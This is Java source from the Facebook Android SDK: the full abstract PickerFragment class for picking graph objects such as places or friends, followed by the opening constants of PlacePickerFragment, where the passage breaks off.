/**
 * Copyright 2012 Facebook
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *    http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.facebook.widget;

import android.app.Activity;
import android.content.Context;
import android.content.res.TypedArray;
import android.graphics.drawable.Drawable;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v4.app.LoaderManager;
import android.support.v4.content.Loader;
import android.text.TextUtils;
import android.util.AttributeSet;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.ViewStub;
import android.view.animation.AlphaAnimation;
import android.widget.*;
import com.facebook.*;
import com.facebook.android.R;
import com.facebook.model.GraphObject;
import com.facebook.internal.SessionTracker;

import java.util.*;

/**
 * Provides functionality common to SDK UI elements that allow the user to pick one or more
 * graph objects (e.g., places, friends) from a list of possibilities. The UI is exposed as a
 * Fragment to allow to it to be included in an Activity along with other Fragments. The Fragments
 * can be configured by passing parameters as part of their Intent bundle, or (for certain
 * properties) by specifying attributes in their XML layout files.
 * <br/>
 * PickerFragments support callbacks that will be called in the event of an error, when the
 * underlying data has been changed, or when the set of selected graph objects changes.
 */
public abstract class PickerFragment<T extends GraphObject> extends Fragment {
    /**
     * The key for a boolean parameter in the fragment's Intent bundle to indicate whether the
     * picker should show pictures (if available) for the graph objects.
     */
    public static final String SHOW_PICTURES_BUNDLE_KEY = "com.facebook.widget.PickerFragment.ShowPictures";
    /**
     * The key for a String parameter in the fragment's Intent bundle to indicate which extra fields
     * beyond the default fields should be retrieved for any graph objects in the results.
     */
    public static final String EXTRA_FIELDS_BUNDLE_KEY = "com.facebook.widget.PickerFragment.ExtraFields";
    /**
     * The key for a boolean parameter in the fragment's Intent bundle to indicate whether the
     * picker should display a title bar with a Done button.
     */
    public static final String SHOW_TITLE_BAR_BUNDLE_KEY = "com.facebook.widget.PickerFragment.ShowTitleBar";
    /**
     * The key for a String parameter in the fragment's Intent bundle to indicate the text to
     * display in the title bar.
     */
    public static final String TITLE_TEXT_BUNDLE_KEY = "com.facebook.widget.PickerFragment.TitleText";
    /**
     * The key for a String parameter in the fragment's Intent bundle to indicate the text to
     * display in the Done btuton.
     */
    public static final String DONE_BUTTON_TEXT_BUNDLE_KEY = "com.facebook.widget.PickerFragment.DoneButtonText";

    private static final String SELECTION_BUNDLE_KEY = "com.facebook.android.PickerFragment.Selection";
    private static final String ACTIVITY_CIRCLE_SHOW_KEY = "com.facebook.android.PickerFragment.ActivityCircleShown";
    private static final int PROFILE_PICTURE_PREFETCH_BUFFER = 5;

    private final int layout;
    private OnErrorListener onErrorListener;
    private OnDataChangedListener onDataChangedListener;
    private OnSelectionChangedListener onSelectionChangedListener;
    private OnDoneButtonClickedListener onDoneButtonClickedListener;
    private GraphObjectFilter<T> filter;
    private boolean showPictures = true;
    private boolean showTitleBar = true;
    private ListView listView;
    HashSet<String> extraFields = new HashSet<String>();
    GraphObjectAdapter<T> adapter;
    private final Class<T> graphObjectClass;
    private LoadingStrategy loadingStrategy;
    private SelectionStrategy selectionStrategy;
    private ProgressBar activityCircle;
    private SessionTracker sessionTracker;
    private String titleText;
    private String doneButtonText;
    private TextView titleTextView;
    private Button doneButton;
    private Drawable titleBarBackground;
    private Drawable doneButtonBackground;

    PickerFragment(Class<T> graphObjectClass, int layout, Bundle args) {
        this.graphObjectClass = graphObjectClass;
        this.layout = layout;

        setPickerFragmentSettingsFromBundle(args);
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        adapter = createAdapter();
        adapter.setFilter(new GraphObjectAdapter.Filter<T>() {
            @Override
            public boolean includeItem(T graphObject) {
                return filterIncludesItem(graphObject);
            }
        });
    }

    @Override
    public void onInflate(Activity activity, AttributeSet attrs, Bundle savedInstanceState) {
        super.onInflate(activity, attrs, savedInstanceState);
        TypedArray a = activity.obtainStyledAttributes(attrs, R.styleable.com_facebook_picker_fragment);

        setShowPictures(a.getBoolean(R.styleable.com_facebook_picker_fragment_show_pictures, showPictures));
        String extraFieldsString = a.getString(R.styleable.com_facebook_picker_fragment_extra_fields);
        if (extraFieldsString != null) {
            String[] strings = extraFieldsString.split(",");
            setExtraFields(Arrays.asList(strings));
        }

        showTitleBar = a.getBoolean(R.styleable.com_facebook_picker_fragment_show_title_bar, showTitleBar);
        titleText = a.getString(R.styleable.com_facebook_picker_fragment_title_text);
        doneButtonText = a.getString(R.styleable.com_facebook_picker_fragment_done_button_text);
        titleBarBackground = a.getDrawable(R.styleable.com_facebook_picker_fragment_title_bar_background);
        doneButtonBackground = a.getDrawable(R.styleable.com_facebook_picker_fragment_done_button_background);

        a.recycle();
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        ViewGroup view = (ViewGroup) inflater.inflate(layout, container, false);

        listView = (ListView) view.findViewById(R.id.com_facebook_picker_list_view);
        listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> parent, View v, int position, long id) {
                onListItemClick((ListView) parent, v, position);
            }
        });
        listView.setOnLongClickListener(new View.OnLongClickListener() {
            @Override
            public boolean onLongClick(View v) {
                // We don't actually do anything differently on long-clicks, but setting the listener
                // enables the selector transition that we have for visual consistency with the
                // Facebook app's pickers.
                return false;
            }
        });
        listView.setOnScrollListener(onScrollListener);
        listView.setAdapter(adapter);

        activityCircle = (ProgressBar) view.findViewById(R.id.com_facebook_picker_activity_circle);

        return view;
    }

    @Override
    public void onActivityCreated(final Bundle savedInstanceState) {
        super.onActivityCreated(savedInstanceState);

        sessionTracker = new SessionTracker(getActivity(), new Session.StatusCallback() {
            @Override
            public void call(Session session, SessionState state, Exception exception) {
                if (!session.isOpened()) {
                    // When a session is closed, we want to clear out our data so it is not visible to subsequent users
                    clearResults();
                }
            }
        });

        setSettingsFromBundle(savedInstanceState);

        loadingStrategy = createLoadingStrategy();
        loadingStrategy.attach(adapter);

        selectionStrategy = createSelectionStrategy();
        selectionStrategy.readSelectionFromBundle(savedInstanceState, SELECTION_BUNDLE_KEY);

        // Should we display a title bar? (We need to do this after we've retrieved our bundle settings.)
        if (showTitleBar) {
            inflateTitleBar((ViewGroup) getView());
        }

        if (activityCircle != null && savedInstanceState != null) {
            boolean shown = savedInstanceState.getBoolean(ACTIVITY_CIRCLE_SHOW_KEY, false);
            if (shown) {
                displayActivityCircle();
            } else {
                // Should be hidden already, but just to be sure.
                hideActivityCircle();
            }
        }
    }

    @Override
    public void onDetach() {
        super.onDetach();

        listView.setOnScrollListener(null);
        listView.setAdapter(null);

        loadingStrategy.detach();
        sessionTracker.stopTracking();
    }

    @Override
    public void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);

        saveSettingsToBundle(outState);
        selectionStrategy.saveSelectionToBundle(outState, SELECTION_BUNDLE_KEY);
        if (activityCircle != null) {
            outState.putBoolean(ACTIVITY_CIRCLE_SHOW_KEY, activityCircle.getVisibility() == View.VISIBLE);
        }
    }

    @Override
    public void setArguments(Bundle args) {
        super.setArguments(args);
        setSettingsFromBundle(args);
    }

    /**
     * Gets the current OnDataChangedListener for this fragment, which will be called whenever
     * the underlying data being displaying in the picker has changed.
     *
     * @return the OnDataChangedListener, or null if there is none
     */
    public OnDataChangedListener getOnDataChangedListener() {
        return onDataChangedListener;
    }

    /**
     * Sets the current OnDataChangedListener for this fragment, which will be called whenever
     * the underlying data being displaying in the picker has changed.
     *
     * @param onDataChangedListener the OnDataChangedListener, or null if there is none
     */
    public void setOnDataChangedListener(OnDataChangedListener onDataChangedListener) {
        this.onDataChangedListener = onDataChangedListener;
    }

    /**
     * Gets the current OnSelectionChangedListener for this fragment, which will be called
     * whenever the user selects or unselects a graph object in the list.
     *
     * @return the OnSelectionChangedListener, or null if there is none
     */
    public OnSelectionChangedListener getOnSelectionChangedListener() {
        return onSelectionChangedListener;
    }

    /**
     * Sets the current OnSelectionChangedListener for this fragment, which will be called
     * whenever the user selects or unselects a graph object in the list.
     *
     * @param onSelectionChangedListener the OnSelectionChangedListener, or null if there is none
     */
    public void setOnSelectionChangedListener(
            OnSelectionChangedListener onSelectionChangedListener) {
        this.onSelectionChangedListener = onSelectionChangedListener;
    }

    /**
     * Gets the current OnDoneButtonClickedListener for this fragment, which will be called
     * when the user clicks the Done button.
     *
     * @return the OnDoneButtonClickedListener, or null if there is none
     */
    public OnDoneButtonClickedListener getOnDoneButtonClickedListener() {
        return onDoneButtonClickedListener;
    }

    /**
     * Sets the current OnDoneButtonClickedListener for this fragment, which will be called
     * when the user clicks the Done button. This will only be possible if the title bar is
     * being shown in this fragment.
     *
     * @param onDoneButtonClickedListener the OnDoneButtonClickedListener, or null if there is none
     */
    public void setOnDoneButtonClickedListener(OnDoneButtonClickedListener onDoneButtonClickedListener) {
        this.onDoneButtonClickedListener = onDoneButtonClickedListener;
    }

    /**
     * Gets the current OnErrorListener for this fragment, which will be called in the event
     * of network or other errors encountered while populating the graph objects in the list.
     *
     * @return the OnErrorListener, or null if there is none
     */
    public OnErrorListener getOnErrorListener() {
        return onErrorListener;
    }

    /**
     * Sets the current OnErrorListener for this fragment, which will be called in the event
     * of network or other errors encountered while populating the graph objects in the list.
     *
     * @param onErrorListener the OnErrorListener, or null if there is none
     */
    public void setOnErrorListener(OnErrorListener onErrorListener) {
        this.onErrorListener = onErrorListener;
    }

    /**
     * Gets the current filter for this fragment, which will be called for each graph object
     * returned from the service to determine if it should be displayed in the list.
     * If no filter is specified, all retrieved graph objects will be displayed.
     *
     * @return the GraphObjectFilter, or null if there is none
     */
    public GraphObjectFilter<T> getFilter() {
        return filter;
    }

    /**
     * Sets the current filter for this fragment, which will be called for each graph object
     * returned from the service to determine if it should be displayed in the list.
     * If no filter is specified, all retrieved graph objects will be displayed.
     *
     * @param filter the GraphObjectFilter, or null if there is none
     */
    public void setFilter(GraphObjectFilter<T> filter) {
        this.filter = filter;
    }

    /**
     * Gets the Session to use for any Facebook requests this fragment will make.
     *
     * @return the Session that will be used for any Facebook requests, or null if there is none
     */
    public Session getSession() {
        return sessionTracker.getSession();
    }

    /**
     * Sets the Session to use for any Facebook requests this fragment will make. If the
     * parameter is null, the fragment will use the current active session, if any.
     *
     * @param session the Session to use for Facebook requests, or null to use the active session
     */
    public void setSession(Session session) {
        sessionTracker.setSession(session);
    }

    /**
     * Gets whether to display pictures, if available, for displayed graph objects.
     *
     * @return true if pictures should be displayed, false if not
     */
    public boolean getShowPictures() {
        return showPictures;
    }

    /**
     * Sets whether to display pictures, if available, for displayed graph objects.
     *
     * @param showPictures true if pictures should be displayed, false if not
     */
    public void setShowPictures(boolean showPictures) {
        this.showPictures = showPictures;
    }

    /**
     * Gets the extra fields to request for the retrieved graph objects.
     *
     * @return the extra fields to request
     */
    public Set<String> getExtraFields() {
        return new HashSet<String>(extraFields);
    }

    /**
     * Sets the extra fields to request for the retrieved graph objects.
     *
     * @param fields the extra fields to request
     */
    public void setExtraFields(Collection<String> fields) {
        extraFields = new HashSet<String>();
        if (fields != null) {
            extraFields.addAll(fields);
        }
    }

    /**
     * Sets whether to show a title bar with a Done button. This must be
     * called prior to the Fragment going through its creation lifecycle to have an effect.
     *
     * @param showTitleBar true if a title bar should be displayed, false if not
     */
    public void setShowTitleBar(boolean showTitleBar) {
        this.showTitleBar = showTitleBar;
    }

    /**
     * Gets whether to show a title bar with a Done button. The default is true.
     *
     * @return true if a title bar will be shown, false if not.
     */
    public boolean getShowTitleBar() {
        return showTitleBar;
    }

    /**
     * Sets the text to show in the title bar, if a title bar is to be shown. This must be
     * called prior to the Fragment going through its creation lifecycle to have an effect, or
     * the default will be used.
     *
     * @param titleText the text to show in the title bar
     */
    public void setTitleText(String titleText) {
        this.titleText = titleText;
    }

    /**
     * Gets the text to show in the title bar, if a title bar is to be shown.
     *
     * @return the text to show in the title bar
     */
    public String getTitleText() {
        if (titleText == null) {
            titleText = getDefaultTitleText();
        }
        return titleText;
    }

    /**
     * Sets the text to show in the Done button, if a title bar is to be shown. This must be
     * called prior to the Fragment going through its creation lifecycle to have an effect, or
     * the default will be used.
     *
     * @param doneButtonText the text to show in the Done button
     */
    public void setDoneButtonText(String doneButtonText) {
        this.doneButtonText = doneButtonText;
    }

    /**
     * Gets the text to show in the Done button, if a title bar is to be shown.
     *
     * @return the text to show in the Done button
     */
    public String getDoneButtonText() {
        if (doneButtonText == null) {
            doneButtonText = getDefaultDoneButtonText();
        }
        return doneButtonText;
    }

    /**
     * Causes the picker to load data from the service and display it to the user.
     *
     * @param forceReload if true, data will be loaded even if there is already data being displayed (or loading);
     *                    if false, data will not be re-loaded if it is already displayed (or loading)
     */
    public void loadData(boolean forceReload) {
        if (!forceReload && loadingStrategy.isDataPresentOrLoading()) {
            return;
        }
        loadDataSkippingRoundTripIfCached();
    }

    /**
     * Updates the properties of the PickerFragment based on the contents of the supplied Bundle;
     * calling Activities may use this to pass additional configuration information to the
     * PickerFragment beyond what is specified in its XML layout.
     *
     * @param inState a Bundle containing keys corresponding to properties of the PickerFragment
     */
    public void setSettingsFromBundle(Bundle inState) {
        setPickerFragmentSettingsFromBundle(inState);
    }

    boolean filterIncludesItem(T graphObject) {
        if (filter != null) {
            return filter.includeItem(graphObject);
        }
        return true;
    }

    List<T> getSelectedGraphObjects() {
        return adapter.getGraphObjectsById(selectionStrategy.getSelectedIds());
    }

    void saveSettingsToBundle(Bundle outState) {
        outState.putBoolean(SHOW_PICTURES_BUNDLE_KEY, showPictures);
        if (!extraFields.isEmpty()) {
            outState.putString(EXTRA_FIELDS_BUNDLE_KEY, TextUtils.join(",", extraFields));
        }
        outState.putBoolean(SHOW_TITLE_BAR_BUNDLE_KEY, showTitleBar);
        outState.putString(TITLE_TEXT_BUNDLE_KEY, titleText);
        outState.putString(DONE_BUTTON_TEXT_BUNDLE_KEY, doneButtonText);
    }

    abstract Request getRequestForLoadData(Session session);

    abstract PickerFragmentAdapter<T> createAdapter();

    abstract LoadingStrategy createLoadingStrategy();

    abstract SelectionStrategy createSelectionStrategy();

    void onLoadingData() {
    }

    String getDefaultTitleText() {
        return null;
    }

    String getDefaultDoneButtonText() {
        return getString(R.string.com_facebook_picker_done_button_text);
    }

    void displayActivityCircle() {
        if (activityCircle != null) {
            layoutActivityCircle();
            activityCircle.setVisibility(View.VISIBLE);
        }
    }

    void layoutActivityCircle() {
        // If we've got no data, make the activity circle full-opacity. Otherwise we'll dim it to avoid
        //  cluttering the UI.
        float alpha = (!adapter.isEmpty()) ? .25f : 1.0f;
        setAlpha(activityCircle, alpha);
    }

    void hideActivityCircle() {
        if (activityCircle != null) {
            // We use an animation to dim the activity circle; need to clear this or it will remain visible.
            activityCircle.clearAnimation();
            activityCircle.setVisibility(View.INVISIBLE);
        }
    }

    void setSelectionStrategy(SelectionStrategy selectionStrategy) {
        if (selectionStrategy != this.selectionStrategy) {
            this.selectionStrategy = selectionStrategy;
            if (adapter != null) {
                // Adapter should cause a re-render.
                adapter.notifyDataSetChanged();
            }
        }
    }

    private static void setAlpha(View view, float alpha) {
        // Set the alpha appropriately (setAlpha is API >= 11, this technique works on all API levels).
        AlphaAnimation alphaAnimation = new AlphaAnimation(alpha, alpha);
        alphaAnimation.setDuration(0);
        alphaAnimation.setFillAfter(true);
        view.startAnimation(alphaAnimation);
    }


    private void setPickerFragmentSettingsFromBundle(Bundle inState) {
        // We do this in a separate non-overridable method so it is safe to call from the constructor.
        if (inState != null) {
            showPictures = inState.getBoolean(SHOW_PICTURES_BUNDLE_KEY, showPictures);
            String extraFieldsString = inState.getString(EXTRA_FIELDS_BUNDLE_KEY);
            if (extraFieldsString != null) {
                String[] strings = extraFieldsString.split(",");
                setExtraFields(Arrays.asList(strings));
            }
            showTitleBar = inState.getBoolean(SHOW_TITLE_BAR_BUNDLE_KEY, showTitleBar);
            String titleTextString = inState.getString(TITLE_TEXT_BUNDLE_KEY);
            if (titleTextString != null) {
                titleText = titleTextString;
                if (titleTextView != null) {
                    titleTextView.setText(titleText);
                }
            }
            String doneButtonTextString = inState.getString(DONE_BUTTON_TEXT_BUNDLE_KEY);
            if (doneButtonTextString != null) {
                doneButtonText = doneButtonTextString;
                if (doneButton != null) {
                    doneButton.setText(doneButtonText);
                }
            }
        }
    }

    private void inflateTitleBar(ViewGroup view) {
        ViewStub stub = (ViewStub) view.findViewById(R.id.com_facebook_picker_title_bar_stub);
        if (stub != null) {
            View titleBar = stub.inflate();

            final RelativeLayout.LayoutParams layoutParams = new RelativeLayout.LayoutParams(
                    RelativeLayout.LayoutParams.FILL_PARENT,
                    RelativeLayout.LayoutParams.FILL_PARENT);
            layoutParams.addRule(RelativeLayout.BELOW, R.id.com_facebook_picker_title_bar);
            listView.setLayoutParams(layoutParams);

            if (titleBarBackground != null) {
                titleBar.setBackgroundDrawable(titleBarBackground);
            }

            doneButton = (Button) view.findViewById(R.id.com_facebook_picker_done_button);
            if (doneButton != null) {
                doneButton.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        if (onDoneButtonClickedListener != null) {
                            onDoneButtonClickedListener.onDoneButtonClicked(PickerFragment.this);
                        }
                    }
                });

                if (getDoneButtonText() != null) {
                    doneButton.setText(getDoneButtonText());
                }

                if (doneButtonBackground != null) {
                    doneButton.setBackgroundDrawable(doneButtonBackground);
                }
            }

            titleTextView = (TextView) view.findViewById(R.id.com_facebook_picker_title);
            if (titleTextView != null) {
                if (getTitleText() != null) {
                    titleTextView.setText(getTitleText());
                }
            }
        }
    }

    private void onListItemClick(ListView listView, View v, int position) {
        @SuppressWarnings("unchecked")
        T graphObject = (T) listView.getItemAtPosition(position);
        String id = adapter.getIdOfGraphObject(graphObject);
        selectionStrategy.toggleSelection(id);
        adapter.notifyDataSetChanged();

        if (onSelectionChangedListener != null) {
            onSelectionChangedListener.onSelectionChanged(PickerFragment.this);
        }
    }

    private void loadDataSkippingRoundTripIfCached() {
        clearResults();

        Request request = getRequestForLoadData(getSession());
        if (request != null) {
            onLoadingData();
            loadingStrategy.startLoading(request);
        }
    }

    private void clearResults() {
        if (adapter != null) {
            boolean wasSelection = !selectionStrategy.isEmpty();
            boolean wasData = !adapter.isEmpty();

            loadingStrategy.clearResults();
            selectionStrategy.clear();
            adapter.notifyDataSetChanged();

            // Tell anyone who cares the data and selection has changed, if they have.
            if (wasData && onDataChangedListener != null) {
                onDataChangedListener.onDataChanged(PickerFragment.this);
            }
            if (wasSelection && onSelectionChangedListener != null) {
                onSelectionChangedListener.onSelectionChanged(PickerFragment.this);
            }
        }
    }

    void updateAdapter(SimpleGraphObjectCursor<T> data) {
        if (adapter != null) {
            // As we fetch additional results and add them to the table, we do not
            // want the items displayed jumping around seemingly at random, frustrating the user's
            // attempts at scrolling, etc. Since results may be added anywhere in
            // the table, we choose to try to keep the first visible row in a fixed
            // position (from the user's perspective). We try to keep it positioned at
            // the same offset from the top of the screen so adding new items seems
            // smoother, as opposed to having it "snap" to a multiple of row height

            // We use the second row, to give context above and below it and avoid
            // cases where the first row is only barely visible, thus providing little context.
            // The exception is where the very first row is visible, in which case we use that.
            View view = listView.getChildAt(1);
            int anchorPosition = listView.getFirstVisiblePosition();
            if (anchorPosition > 0) {
                anchorPosition++;
            }
            GraphObjectAdapter.SectionAndItem<T> anchorItem = adapter.getSectionAndItem(anchorPosition);
            final int top = (view != null &&
                    anchorItem.getType() != GraphObjectAdapter.SectionAndItem.Type.ACTIVITY_CIRCLE) ?
                    view.getTop() : 0;

            // Now actually add the results.
            boolean dataChanged = adapter.changeCursor(data);

            if (view != null && anchorItem != null) {
                // Put the item back in the same spot it was.
                final int newPositionOfItem = adapter.getPosition(anchorItem.sectionKey, anchorItem.graphObject);
                if (newPositionOfItem != -1) {
                    listView.setSelectionFromTop(newPositionOfItem, top);
                }
            }

            if (dataChanged && onDataChangedListener != null) {
                onDataChangedListener.onDataChanged(PickerFragment.this);
            }
        }
    }

    private void reprioritizeDownloads() {
        int lastVisibleItem = listView.getLastVisiblePosition();
        if (lastVisibleItem >= 0) {
            int firstVisibleItem = listView.getFirstVisiblePosition();
            adapter.prioritizeViewRange(firstVisibleItem, lastVisibleItem, PROFILE_PICTURE_PREFETCH_BUFFER);
        }
    }

    private ListView.OnScrollListener onScrollListener = new ListView.OnScrollListener() {
        @Override
        public void onScrollStateChanged(AbsListView view, int scrollState) {
        }

        @Override
        public void onScroll(AbsListView view, int firstVisibleItem, int visibleItemCount, int totalItemCount) {
            reprioritizeDownloads();
        }
    };

    /**
     * Callback interface that will be called when a network or other error is encountered
     * while retrieving graph objects.
     */
    public interface OnErrorListener {
        /**
         * Called when a network or other error is encountered.
         *
         * @param error a FacebookException representing the error that was encountered.
         */
        void onError(PickerFragment<?> fragment, FacebookException error);
    }

    /**
     * Callback interface that will be called when the underlying data being displayed in the
     * picker has been updated.
     */
    public interface OnDataChangedListener {
        /**
         * Called when the set of data being displayed in the picker has changed.
         */
        void onDataChanged(PickerFragment<?> fragment);
    }

    /**
     * Callback interface that will be called when the user selects or unselects graph objects
     * in the picker.
     */
    public interface OnSelectionChangedListener {
        /**
         * Called when the user selects or unselects graph objects in the picker.
         */
        void onSelectionChanged(PickerFragment<?> fragment);
    }

    /**
     * Callback interface that will be called when the user clicks the Done button on the
     * title bar.
     */
    public interface OnDoneButtonClickedListener {
        /**
         * Called when the user clicks the Done button.
         */
        void onDoneButtonClicked(PickerFragment<?> fragment);
    }

    /**
     * Callback interface that will be called to determine if a graph object should be displayed.
     *
     * @param <T>
     */
    public interface GraphObjectFilter<T> {
        /**
         * Called to determine if a graph object should be displayed.
         *
         * @param graphObject the graph object
         * @return true to display the graph object, false to hide it
         */
        boolean includeItem(T graphObject);
    }

    abstract class LoadingStrategy {
        protected final static int CACHED_RESULT_REFRESH_DELAY = 2 * 1000;

        protected GraphObjectPagingLoader<T> loader;
        protected GraphObjectAdapter<T> adapter;

        public void attach(GraphObjectAdapter<T> adapter) {
            loader = (GraphObjectPagingLoader<T>) getLoaderManager().initLoader(0, null,
                    new LoaderManager.LoaderCallbacks<SimpleGraphObjectCursor<T>>() {
                        @Override
                        public Loader<SimpleGraphObjectCursor<T>> onCreateLoader(int id, Bundle args) {
                            return LoadingStrategy.this.onCreateLoader();
                        }

                        @Override
                        public void onLoadFinished(Loader<SimpleGraphObjectCursor<T>> loader,
                                SimpleGraphObjectCursor<T> data) {
                            if (loader != LoadingStrategy.this.loader) {
                                throw new FacebookException("Received callback for unknown loader.");
                            }
                            LoadingStrategy.this.onLoadFinished((GraphObjectPagingLoader<T>) loader, data);
                        }

                        @Override
                        public void onLoaderReset(Loader<SimpleGraphObjectCursor<T>> loader) {
                            if (loader != LoadingStrategy.this.loader) {
                                throw new FacebookException("Received callback for unknown loader.");
                            }
                            LoadingStrategy.this.onLoadReset((GraphObjectPagingLoader<T>) loader);
                        }
                    });

            loader.setOnErrorListener(new GraphObjectPagingLoader.OnErrorListener() {
                @Override
                public void onError(FacebookException error, GraphObjectPagingLoader<?> loader) {
                    hideActivityCircle();
                    if (onErrorListener != null) {
                        onErrorListener.onError(PickerFragment.this, error);
                    }
                }
            });

            this.adapter = adapter;
            // Tell the adapter about any data we might already have.
            this.adapter.changeCursor(loader.getCursor());
        }

        public void detach() {
            adapter.setDataNeededListener(null);
            loader.setOnErrorListener(null);

            loader = null;
            adapter = null;
        }

        public void clearResults() {
            if (loader != null) {
                loader.clearResults();
            }
        }

        public void startLoading(Request request) {
            if (loader != null) {
                loader.startLoading(request, true);
                onStartLoading(loader, request);
            }
        }

        public boolean isDataPresentOrLoading() {
            return !adapter.isEmpty() || loader.isLoading();
        }

        protected GraphObjectPagingLoader<T> onCreateLoader() {
            return new GraphObjectPagingLoader<T>(getActivity(), graphObjectClass);
        }

        protected void onStartLoading(GraphObjectPagingLoader<T> loader, Request request) {
            displayActivityCircle();
        }

        protected void onLoadReset(GraphObjectPagingLoader<T> loader) {
            adapter.changeCursor(null);
        }

        protected void onLoadFinished(GraphObjectPagingLoader<T> loader, SimpleGraphObjectCursor<T> data) {
            updateAdapter(data);
        }
    }

    abstract class SelectionStrategy {
        abstract boolean isSelected(String id);

        abstract void toggleSelection(String id);

        abstract Collection<String> getSelectedIds();

        abstract void clear();

        abstract boolean isEmpty();

        abstract boolean shouldShowCheckBoxIfUnselected();

        abstract void saveSelectionToBundle(Bundle outBundle, String key);

        abstract void readSelectionFromBundle(Bundle inBundle, String key);
    }

    class SingleSelectionStrategy extends SelectionStrategy {
        private String selectedId;

        public Collection<String> getSelectedIds() {
            return Arrays.asList(new String[]{selectedId});
        }

        @Override
        boolean isSelected(String id) {
            return selectedId != null && id != null && selectedId.equals(id);
        }

        @Override
        void toggleSelection(String id) {
            if (selectedId != null && selectedId.equals(id)) {
                selectedId = null;
            } else {
                selectedId = id;
            }
        }

        @Override
        void saveSelectionToBundle(Bundle outBundle, String key) {
            if (!TextUtils.isEmpty(selectedId)) {
                outBundle.putString(key, selectedId);
            }
        }

        @Override
        void readSelectionFromBundle(Bundle inBundle, String key) {
            if (inBundle != null) {
                selectedId = inBundle.getString(key);
            }
        }

        @Override
        public void clear() {
            selectedId = null;
        }

        @Override
        boolean isEmpty() {
            return selectedId == null;
        }

        @Override
        boolean shouldShowCheckBoxIfUnselected() {
            return false;
        }
    }

    class MultiSelectionStrategy extends SelectionStrategy {
        private Set<String> selectedIds = new HashSet<String>();

        public Collection<String> getSelectedIds() {
            return selectedIds;
        }

        @Override
        boolean isSelected(String id) {
            return id != null && selectedIds.contains(id);
        }

        @Override
        void toggleSelection(String id) {
            if (id != null) {
                if (selectedIds.contains(id)) {
                    selectedIds.remove(id);
                } else {
                    selectedIds.add(id);
                }
            }
        }

        @Override
        void saveSelectionToBundle(Bundle outBundle, String key) {
            if (!selectedIds.isEmpty()) {
                String ids = TextUtils.join(",", selectedIds);
                outBundle.putString(key, ids);
            }
        }

        @Override
        void readSelectionFromBundle(Bundle inBundle, String key) {
            if (inBundle != null) {
                String ids = inBundle.getString(key);
                if (ids != null) {
                    String[] splitIds = TextUtils.split(ids, ",");
                    selectedIds.clear();
                    Collections.addAll(selectedIds, splitIds);
                }
            }
        }

        @Override
        public void clear() {
            selectedIds.clear();
        }

        @Override
        boolean isEmpty() {
            return selectedIds.isEmpty();
        }

        @Override
        boolean shouldShowCheckBoxIfUnselected() {
            return true;
        }
    }

    abstract class PickerFragmentAdapter<U extends GraphObject> extends GraphObjectAdapter<T> {
        public PickerFragmentAdapter(Context context) {
            super(context);
        }

        @Override
        boolean isGraphObjectSelected(String graphObjectId) {
            return selectionStrategy.isSelected(graphObjectId);
        }

        @Override
        void updateCheckboxState(CheckBox checkBox, boolean graphObjectSelected) {
            checkBox.setChecked(graphObjectSelected);
            int visible = (graphObjectSelected || selectionStrategy
                    .shouldShowCheckBoxIfUnselected()) ? View.VISIBLE : View.GONE;
            checkBox.setVisibility(visible);
        }
    }
}

/**
 * Copyright 2012 Facebook
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *    http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.facebook.widget;

import android.app.Activity;
import android.content.Context;
import android.content.res.TypedArray;
import android.location.Location;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.Editable;
import android.text.TextUtils;
import android.text.TextWatcher;
import android.util.AttributeSet;
import android.view.ViewGroup;
import android.view.ViewStub;
import android.view.inputmethod.InputMethodManager;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.RelativeLayout;
import com.facebook.*;
import com.facebook.android.R;
import com.facebook.model.GraphPlace;
import com.facebook.internal.Logger;
import com.facebook.internal.Utility;

import java.util.*;

public class PlacePickerFragment extends PickerFragment<GraphPlace> {
    /**
     * The key for an int parameter in the fragment's Intent bundle to indicate the radius in meters around
     * the center point to search. The default is 1000 meters.
     */
    public static final String RADIUS_IN_METERS_BUNDLE_KEY = "com.facebook.widget.PlacePickerFragment.RadiusInMeters";
    /**
     * The key for an int parameter in the fragment's Intent bundle to indicate what how many results to
     * return at a time. The default is 100 results.
     */
    public static final String RESULTS_LIMIT_BUNDLE_KEY = "com.facebook.widget.PlacePickerFragment.ResultsLimit";
    /**
     * The key for a String parameter in the fragment's Intent bundle to indicate what search text should
     * be sent to the service. The default is to have no search text.
     */
    public static final String SEARCH_TEXT_BUNDLE_KEY = "com.facebook.widget.PlacePickerFragment.SearchText";
    /**
     * The key for a Location parameter in the fragment's Intent bundle to indicate what geographical
     * location should be the center of the search.
     */
    public static final String LOCATION_BUNDLE_KEY = "com.facebook.widget.PlacePickerFragment.Location";
    /**
     * The key for a boolean parameter in the fragment's Intent bundle to indicate that the fragment
     * should display a search box and automatically update the search text as it changes.
     */
    public static final String SHOW_SEARCH_BOX_BUNDLE_KEY = "com.facebook.widget.PlacePickerFragment.ShowSearchBox";

    /**
     * The default radius around the center point to search.
     */
    public static final int DEFAULT_RADIUS_IN_METERS = 1000;
    /**
     * The default number of results to retrieve.
     */
    public static final int DEFAULT_RESULTS_LIMIT = 100;

    private static final int searchTextTimerDelayInMilliseconds = 2 * 1000;

    private static final String ID = "id";
    private static final String NAME = "name";
    private static final String LOCATION = "location";
